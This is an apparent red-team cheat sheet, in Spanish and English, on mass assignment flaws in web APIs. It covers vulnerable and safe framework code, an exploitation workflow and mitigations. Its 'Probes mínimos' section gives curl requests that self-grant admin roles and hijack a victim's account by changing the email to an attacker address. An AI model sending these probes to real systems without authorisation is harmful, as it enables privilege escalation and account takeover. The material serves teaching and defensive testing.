---
aliases:
  - Mass Assignment
  - Autobinding Vulnerability
  - Object Injection (Mass Assignment)
  - Unsafe Mass Assignment
tags:
  - vuln/mass-assignment
  - technique/privilege-escalation
  - technique/credential-access
  - technique/initial-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: CheatSheet
linked:
  - "[[Mass Assignment - Deteccion y Reconocimiento]]"
  - "[[Mass Assignment - Vectores Comunes]]"
  - "[[Mass Assignment - Frameworks Vulnerables]]"
  - "[[Mass Assignment - Bypass de Whitelists]]"
  - "[[Mass Assignment - Chains con Otras Vulns]]"
  - "[[Mass Assignment - Tooling]]"
  - "[[BOLA - IDOR]]"
  - "[[Prototype Pollution]]"
  - "[[GraphQL Injection]]"
  - "[[Burp Suite]]"
---
# Mass Assignment

---

## Cheatsheet

### 🎯 Vectores Comunes

````tabs
tab: **Privilege Escalation**
![[Mass Assignment - Vectores Comunes#^ma-vector-privesc]]

tab: **Account Takeover**
![[Mass Assignment - Vectores Comunes#^ma-vector-ato]]

tab: **Financial / Quota Fields**
![[Mass Assignment - Vectores Comunes#^ma-vector-financial]]

tab: **Status Flags**
![[Mass Assignment - Vectores Comunes#^ma-vector-status]]

tab: **Audit Fields (Backdating)**
![[Mass Assignment - Vectores Comunes#^ma-vector-audit]]
````

### 🏛️ Frameworks Vulnerables

````tabs
tab: **Rails (strong_params)**
![[Mass Assignment - Frameworks Vulnerables#^ma-fw-rails]]

tab: **Django (ModelForm / DRF)**
![[Mass Assignment - Frameworks Vulnerables#^ma-fw-django]]

tab: **Spring (Java)**
![[Mass Assignment - Frameworks Vulnerables#^ma-fw-spring]]

tab: **Laravel (PHP)**
![[Mass Assignment - Frameworks Vulnerables#^ma-fw-laravel]]

tab: **Mongoose / NoSQL ORMs**
![[Mass Assignment - Frameworks Vulnerables#^ma-fw-mongoose]]

tab: **GraphQL Input Types**
![[Mass Assignment - Frameworks Vulnerables#^ma-fw-graphql]]
````

### 🔓 Bypass de Whitelists

````tabs
tab: **Nested Object Injection**
![[Mass Assignment - Bypass de Whitelists#^ma-bypass-nested]]

tab: **Array vs Object Polyglot**
![[Mass Assignment - Bypass de Whitelists#^ma-bypass-types]]

tab: **Case Manipulation**
![[Mass Assignment - Bypass de Whitelists#^ma-bypass-case]]

tab: **HTTP Method Override**
![[Mass Assignment - Bypass de Whitelists#^ma-bypass-method]]

tab: **Query String vs Body**
![[Mass Assignment - Bypass de Whitelists#^ma-bypass-query]]
````

### 🔗 Chains con Otras Vulns

````tabs
tab: **IDOR + Mass Assignment**
![[Mass Assignment - Chains con Otras Vulns#^ma-chain-idor]]

tab: **GraphQL Mutation Mass Assign**
![[Mass Assignment - Chains con Otras Vulns#^ma-chain-graphql]]

tab: **JWT Update via Mass Assign**
![[Mass Assignment - Chains con Otras Vulns#^ma-chain-jwt]]

tab: **OAuth Scope Injection**
![[Mass Assignment - Chains con Otras Vulns#^ma-chain-oauth]]

tab: **Prototype Pollution Combo**
![[Mass Assignment - Chains con Otras Vulns#^ma-chain-pp]]
````

### 🛠️ Tooling

````tabs
tab: **Param Miner (Burp)**
![[Mass Assignment - Tooling#^ma-tool-paramminer]]

tab: **Source Map / JS Bundle Review**
![[Mass Assignment - Tooling#^ma-tool-sourcemap]]

tab: **API Documentation Discovery**
![[Mass Assignment - Tooling#^ma-tool-apidocs]]

tab: **ffuf con Field Wordlists**
![[Mass Assignment - Tooling#^ma-tool-ffuf]]

tab: **Manual Review API Docs**
![[Mass Assignment - Tooling#^ma-tool-apidocs]]
````

---

## Overview

**Mass Assignment** = vulnerabilidad donde aplicación toma input del usuario (típicamente JSON body o form data) y lo pasa **directamente** al model layer sin filtrar qué fields son permitidos. Atacante incluye fields sensibles como `isAdmin`, `role`, `email_verified` → backend los persiste sin validation.

OWASP API Security Top 10 — **API6 Mass Assignment** (2019) y **API3 Broken Object Property Level Authorization** (2023). Combinable con IDOR, GraphQL, Prototype Pollution para impactos catastróficos (full ATO, mass privesc).

### Patrón vulnerable canonical

```python
# Pseudocódigo común
def update_user(user_id, request_body):
    user = User.find(user_id)
    user.update(**request_body)  # ← Atacante controls all fields
    user.save()
    return user
```

Si `request_body` incluye `{"name": "x", "is_admin": true}`, backend asigna `is_admin=true` sin verificar que field es permitido para edición por el user.

### Diferencia con vulns relacionadas

| | **Mass Assignment** | **IDOR** | **Prototype Pollution** |
|---|---|---|---|
| Vector | Bind input to model fields | Bind input to record ID | Pollute Object.prototype |
| Scope | Per-request | Per-record | Global runtime |
| Required | API endpoint con body parsing | Object reference exposed | Recursive merge en JS |
| Impact | Field-level privesc | Record-level access | Global pollution |

---

## Workflow de explotación

```
1. Identificar endpoints state-changing (POST/PUT/PATCH).
   - User profile / account management
   - Settings / preferences
   - Order creation / update
   - Admin endpoints (if reachable)

2. Discover model fields:
   - GET response shape → all fields
   - API documentation (Swagger / OpenAPI / GraphQL introspection)
   - Source maps / JS bundle
   - Mobile app DTO (APK / IPA decompile)
   - Error messages

3. Enumerate sensitive field names:
   - Privesc: isAdmin, role, permissions, is_staff, is_superuser
   - ATO: id, user_id, email, password_hash
   - Financial: balance, credits, tier, subscription_status
   - Status: is_active, email_verified, mfa_enabled
   - Audit: created_at, deleted_at, version

4. Probe injection:
   - Send PATCH/PUT con sensitive field
   - Compare response (200 vs 400)
   - Check actual change via subsequent GET

5. Bypass whitelist if filter active:
   - Nested object injection ({user:{role:"admin"}})
   - Case manipulation (is_admin → isAdmin)
   - Method override (PATCH bypasses PUT validation)
   - Query string vs body
   - GraphQL mutation input

6. Chain con otras vulns:
   - IDOR + MA = update victim profile
   - GraphQL + MA = mutation injection
   - PP combo si lodash merge backend
```

---

## Detección rápida

### Recon activo

![[Mass Assignment - Deteccion y Reconocimiento#^ma-detect-endpoints]]

![[Mass Assignment - Deteccion y Reconocimiento#^ma-detect-hidden]]

![[Mass Assignment - Deteccion y Reconocimiento#^ma-detect-model]]


### Indicadores en código backend

```python
# Python — VULN (Django)
def update_user(request, user_id):
    user = User.objects.get(id=user_id)
    for key, value in request.POST.items():
        setattr(user, key, value)  # ← BAD
    user.save()

# Python — SAFE
ALLOWED = {'name', 'email', 'phone'}
for key, value in request.POST.items():
    if key in ALLOWED:
        setattr(user, key, value)
user.save()
```

```ruby
# Rails — VULN (legacy)
@user.update(params[:user])

# Rails — SAFE (strong params)
@user.update(params.require(:user).permit(:name, :email, :phone))
```

```javascript
// Node.js Express — VULN
app.patch('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    Object.assign(user, req.body);  // ← BAD
    await user.save();
});

// Node.js — SAFE
const ALLOWED = ['name', 'email', 'phone'];
const updates = pick(req.body, ALLOWED);
await User.findByIdAndUpdate(req.params.id, updates);
```

### Probes mínimos

```bash
# 1. Self-register con admin field
curl -X POST https://target/api/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"x@evil.com","password":"P@ss","is_admin":true,"role":"admin"}'

# 2. Self update con privesc field
curl -X PATCH https://target/api/profile \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"is_admin":true,"role":"admin"}'

# 3. Verify privesc
curl https://target/api/admin/users \
  -H "Authorization: Bearer $TOKEN"

# 4. IDOR + MA combo
curl -X PATCH https://target/api/users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"atacante@evil.com","email_verified":true}'

# 5. Response shape recon
curl https://target/api/users/me | jq 'keys'
```

---

## Impacto

- **Privilege escalation** — `isAdmin: true` o `role: "admin"` self-set.
- **Account takeover** — `email`, `password_hash`, `mfa_secret` direct change.
- **Cross-tenant escape** — `tenant_id` modify en multi-tenant SaaS.
- **Financial fraud** — `balance`, `credits`, `tier` injection.
- **Status manipulation** — `email_verified: true` skip verify.
- **Audit trail forgery** — `created_at`, `created_by` backdating.
- **Account hijack via IDOR + MA chain** — modify victim's profile.
- **Bulk takeover via GraphQL mutations** — single mutation con multi-target.
- **Persistence backdoor** — set unused field como atacante's API key.

---

## Mitigación (defender)

- **Whitelist explícito de fields** — nunca pasar request body completo a model:
  - Rails: `params.require(:user).permit(:name, :email)` (strong params).
  - Django: `ModelForm.fields = ['name', 'email']` (whitelist exacto).
  - Spring: usar DTOs separadas de entities, copy con `BeanUtils.copyProperties(dto, entity, "isAdmin")` (excluir).
  - Laravel: `protected $fillable = ['name', 'email']`.
  - Express: `pick(req.body, ['name', 'email'])` antes de update.
- **DTO pattern** — separar Data Transfer Object del Database Entity. DTO contiene solo fields permitidos.
- **Read-only flag en serializers** — DRF `read_only_fields = ['id', 'is_admin']`, Mongoose `select: false`.
- **Permission check per-field** — admin can edit role, user cannot.
- **Schema validation strict** — JSON Schema / Joi / Zod / Yup con `additionalProperties: false`.
- **Avoid `accept_nested_attributes_for`** sin permission control.
- **GraphQL** — input types específicos por scenario (`UpdateUserPublicInput` vs `UpdateUserAdminInput`).
- **Audit con automated tools** — Param Miner, schema diff CI/CD.
- **OWASP API top 10** — train teams en API3 (BOPLA).
- **Code review pattern detection** — grep for direct mass-assign anti-patterns.
- **Default deny** — nuevos fields del model NO mutable por default; require explicit opt-in.

---

## Para entender Mass Assignment

**Por qué los frameworks lo permiten:**

Frameworks ORM (Rails, Django, Eloquent, Mongoose) ofrecen **autobinding** como conveniencia: dev escribe `User.update(params)` y todos los fields pasan. Reduce boilerplate. Funciona para casos simples (form solo con `name`, `email`).

Anti-pattern surge cuando model crece (agregan `is_admin`, `tier`, `balance`) pero el endpoint no se actualiza para excluir nuevos fields. Atacante envía field oculto → backend asigna sin saber que no debería.

**Por qué el bug persiste:**

1. **Convention over configuration** — frameworks make autobinding default-on.
2. **Add field to model = silent vulnerability** — agregar `is_admin` al model NO actualiza endpoints automáticamente.
3. **Documentation gap** — devs aprenden `user.update(params)` sin la advertencia.
4. **Test gap** — tests positivos verifican que `name` updates; raramente verifican que `is_admin` NO updates.
5. **Field naming convention** — `is_admin` parece "obviamente sensible" pero el filter no se aplica automáticamente.

**Histórico — GitHub 2012:**

Egor Homakov demostró Mass Assignment en GitHub Rails app. Inyectó `public_key` en repo update → tomó control de Ruby on Rails repo. Devolvió responsibly, pero forzó a Rails community a popularizar `strong_params` (Rails 4.0).

**Diferencia con SQLi en impacto:**

SQLi compromete DB. Mass Assignment compromete **lógica de negocio**: campo `is_admin` cambia significado del role del user. SQLi necesita interaction con DB query. Mass Assignment requiere solo un endpoint API mal escrito + un campo sensible.

---

## Recursos

- [OWASP API Security Top 10 - 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/) — API3 BOPLA.
- [OWASP API Security Top 10 - 2019](https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/) — API6 Mass Assignment original.
- [PortSwigger - Mass Assignment](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution) — labs.
- [PayloadsAllTheThings - Mass Assignment](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment) — payloads.
- [HackTricks - Mass Assignment](https://book.hacktricks.xyz/pentesting-web/parameter-pollution) — referencia.
- [Egor Homakov - GitHub Mass Assignment (2012)](http://homakov.blogspot.com/2012/03/how-to.html) — paper histórico.
- [Rails Strong Params](https://guides.rubyonrails.org/action_controller_overview.html#strong-parameters) — guide.
- [Django Forms](https://docs.djangoproject.com/en/4.2/topics/forms/modelforms/) — guide.
- [Spring DTO Best Practices](https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-methods/modelattrib-method-args.html) — guide.
- [API Security Cheatsheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) — defenses.

---
